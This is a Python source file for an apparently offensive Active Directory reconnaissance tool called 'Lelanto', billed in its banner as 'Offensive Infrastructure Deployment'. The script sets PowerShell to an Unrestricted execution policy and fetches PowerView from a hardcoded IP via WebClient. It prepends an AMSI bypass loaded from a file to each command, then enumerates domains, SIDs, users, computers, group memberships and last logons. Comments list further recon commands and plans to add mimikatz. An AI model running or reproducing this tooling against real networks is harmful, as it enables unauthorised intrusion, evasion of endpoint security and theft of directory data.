from colorama import Fore
import getpass,time,sys
import subprocess,os
from tabulate import tabulate
from prettytable import PrettyTable

username=getpass.getuser()
lista_tools=["PowerView.ps1","PowerUp.ps1"]
root=f"C:\\Users\\{username}\\Desktop\\Lelanto\\"
data=f"{root}data\\"
ok=f"{Fore.GREEN}[INFO]{Fore.WHITE}"
error=f"{Fore.RED}[ERROR]{Fore.WHITE}"
warning=f"{Fore.YELLOW}[WARNING]{Fore.WHITE}"
path_AMSI=f"{root}data\\bypass_AMSI.txt"
ping="192.168.73.132"

def listToString(s): 
    str1 = " " 
    return (str1.join(s))


def configurazione():
    with open(path_AMSI,"r") as file1:
        stringa=file1.read()
    
    return stringa


def powershell_commandLine(cmd):
    completed = subprocess.run(["powershell", "-Command", cmd], capture_output=True)
    return completed

def cleanstring(string):
    value=string.stdout
    value=value.rstrip()
    value=value.decode("utf-8")
    return value

def stepONE_setupPolicy():
    print(f"{ok} 1-Starting with the Initial configuration...\n")
    print(f"{warning} Check policy status for powershell script execution...")
    policy="Get-ExecutionPolicy"
    value=powershell_commandLine(policy)
    if value.returncode != 0:
        print(error + " An error occured: %s", hello_info.stderr)
    else:
        value=cleanstring(value)
        if value != "Unrestricted":
            print(f"{warning} The actual policy doesn't run any powershell script...Now I'll change it")
            policy="Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted"
            value=powershell_commandLine(policy)
            policy="Get-ExecutionPolicy"
            value=powershell_commandLine(policy)
            if value.returncode != 0:
                print(error + " An error occured: %s", hello_info.stderr)
            else:
                value=cleanstring(value)
                print(f"{ok} Actual state: {value}")
        else:
            print(f"{ok} Actual state: {value}")


#TODO: Installing other tools like mimikatz
def stepTWO_Installing_tools():
    #print("\n======================================================================================================\n")
    print(f"\n{ok} 2-Starting with the Installing Tools...\n")
    lista_tool_mancanti=[]
    trovato=0
    count=1
    for tool in lista_tools:
        path=data+tool
        found=os.path.isfile(path)
        if found:
            print(f"{ok} {count}) Program {tool} FOUND!!!")
            trovato=1
            count=count+1
        else:
            lista_tool_mancanti.append(tool)

    if len(lista_tool_mancanti) > 0:
        response = os.system("ping " + ping)
        if response == 0:
            print("\n")
            print (f"{ok} The server is up!!")
            downloadPV=f"IEX (New-Object Net.WebClient).DownloadFile('http://192.168.73.132/Recon/01302022_22_46_52/01302022_22_46_52.ps1','{data}{lista_tools[0]}');"
            print(f"{ok} Downloading Powerview")
            powershell_commandLine(downloadPV)
        else:
            print (f"{errore} The server is down!!!")
   


def title():
    print(Fore.BLUE)
    banner_top = '''
                                ----__ ''""    ___``'/````\   
                              ,'     ,'    `--/   __,      \-,,,`.
                        ,""""'     .' ;-.    ,  ,'  \             `"""".
                      ,'           `-(   `._(_,'     )_                `.
                     ,'         ,---. \ @ ;   \ @ _,'                   `.
                ,-""'         ,'      ,--'-    `;'                       `.
               ,'            ,'      (      `. ,'                          `.
               ;            ,'        \    _,','   Offensive                `.
              ,'            ;          `--'  ,'  Infrastructure               `.
             ,'             ;          __    (     Deployment                `.
             ;              `____...  `78b   `.                  ,'           ,'
             ;    ...----''" )  _.-  .d8P    `.                ,'    ,'    ,'
    
    '''
    banner = '''_....----'" '.        _..--"_.-:.-' .'        `.             ,''.   ,' `--'
              `" mGk "" _.-'' .-'`-.:..___...--' `-._      ,-"'   `-'
        _.--'       _.-'    .'   .' .'               `"""""
  __.-''        _.-'     .-'   .'  /     ~~~
 '          _.-' .-'  .-'        .'    
        _.-'  .-'  .-' .'  .'   /      LELANTO
    _.-'      .-'   .-'  .'   .'   
_.-'       .-'    .'   .'    /           ~~~
       _.-'    .-'   .'    .'     Created by Claudio Rimensi
    .-'            .'

    '''
    print( banner_top + banner + "\n\n")
    print(Fore.WHITE)


'''
TODO: Vedere pc dentro un OU Get-NetOU Groups | select cn | %{Get-NetComputer | select cn}
TODO:Enumerare GPO applicati ad una OU: (Get-NetOU <nome OU>).gplink
TODO: get-NetGPO -ADSpAth 'LDAP...'
TODO: le 2 righe sopra si possono unire in questo comando: Get-NetGPO -ADSpath ((Get-NetOU StudentMachines -FullData).gplink.split(";")[0] -replace "^.")
TODO:ACL Get-ObjectAcl -SamAccountName "spiderman" -ResolveGUIDs -Verbose | select ActiveDirectoryRights,ObjectAceType,AceQualifier
TODO: Enumerate all domains in the forest: Get-NetForestDomain -Verbose | select name
'''
def StepTHREE_Enumeration():
    print(f"\n{ok} 3-Starting with the enumeration...\n")
    time.sleep(1)
    print(f"{ok} Bypassing AMSI Security...")
    bypass=configurazione()
    command0=bypass + "; " + f"Import-Module {data}PowerView.ps1" + "; "
    command1=command0 + " Get-NetDomain"
    value=powershell_commandLine(command1)
    value=cleanstring(value)
    value_list=value.split("\n")
    try:
        forest=value_list[2].split(":")[1].rstrip()
        domain=value_list[-1].split(":")[1].rstrip()
        domain_controller=value_list[3].split(":")[1].rstrip()
    except IndexError as e:
        print(f"{error} Windows Server offline..\n")
        sys.exit(0)
    command2=command0 + " Get-DomainSID"
    value=powershell_commandLine(command2)
    domainSID=cleanstring(value)
    try:
        command66=command0 + " Get-NetOU | select name"
        value=powershell_commandLine(command66)
        ou=cleanstring(value)
        ou=ou.split("\n")
        ou=ou[3:]
        ou=listToString(ou)
        table=[["Forest",forest],["Domain",domain],["Domain Controller",domain_controller],
        ["SID Domain",domainSID],["Organization Unit",ou]]
        headers=["Oggetto","Value"]
        #PRINT Forest,Domain,Domain Controller,SID Domain, OU
        print(tabulate(table,headers,tablefmt="fancy_grid"))

        command3=command0+ " Get-NetUser | select cn"
        value=powershell_commandLine(command3)
        list_user=cleanstring(value)
        list_user=list_user.split("\n")
        list_user=list_user[3:]

        command6=command0+ " Get-NetUser | select userprincipalname"
        value=powershell_commandLine(command6)
        list_account=cleanstring(value)
        list_account=list_account.split("\n")
        list_account=list_account[3:]
        tableUser=PrettyTable(["Username","Account"])
        for user,account in zip(list_user,list_account):
            tableUser.add_row([user.rstrip(),account.rstrip()])
        
        #PRINT USERNAME IN THE DOMAIN
        print(tableUser)

        command4=command0+ " Get-NetComputer | select cn"
        value=powershell_commandLine(command4)
        list_pc=cleanstring(value)
        list_pc=list_pc.split("\n")
        list_pc=list_pc[3:]

        command5=command0+ " Get-NetComputer | select operatingsystem"
        value=powershell_commandLine(command5)
        list_os=cleanstring(value)
        list_os=list_os.split("\n")
        list_os=list_os[3:]

        command7=command0+ " Get-NetComputer -Ping | select name"
        value=powershell_commandLine(command7)
        list_alive=cleanstring(value)
        list_alive=list_alive.split("\n")
        list_alive=list_alive[3:]

        tablePC=PrettyTable(["Computer Name","Operating System","Computer alive"])
        for user,os,alive in zip(list_pc,list_os,list_alive):
            tablePC.add_row([user.rstrip(),os.rstrip(),alive.rstrip()])
        
        #PRINT COMPUTER IN THE DOMAIN
        print(tablePC)

    
        check=input(f"{warning} Do you want check something? 1-YES 2-NO: ")
        check=int(check)
        if check==1:
            go=True
            while go:
                usernamecheck = input(f"{warning} Put account name to check the belonging to groups: ")
                command8=command0+ f" Get-NetGroup -UserName {usernamecheck} | select name"
                value=powershell_commandLine(command8)
                list_group=cleanstring(value)
                list_group=list_group.split("\n")
                list_group=list_group[3:]
                tablegroup=PrettyTable(["Groups"])
                for group in list_group:
                    tablegroup.add_row([group.rstrip()])
                print(tablegroup)
                question=input(f"{warning} Check another account name? 1-YES 2-NO: ")
                question=int(question)
                if question == 2:
                    usernamecheck = input(f"{warning} Put computer name to check last registered account: ")
                    command8=command0+ f" Get-LastLoggedOn -ComputerName {usernamecheck}"
                    value=powershell_commandLine(command8)
                    list_group=cleanstring(value)
                    list_group=list_group.split("\n")
                    list_group=list_group[3:]
                    tablegroup=PrettyTable(["Last Logged On"])
                    for group in list_group:
                        tablegroup.add_row([group.rstrip()])
                    print(tablegroup)
                    question=input(f"{warning} Check another account computer? 1-YES 2-NO: ")
                    question=int(question)
                    if question == 2:
                        go=False
    except IndexError as e:
        print(f"{error} Windows Server offline..\n")
        sys.exit(0)
    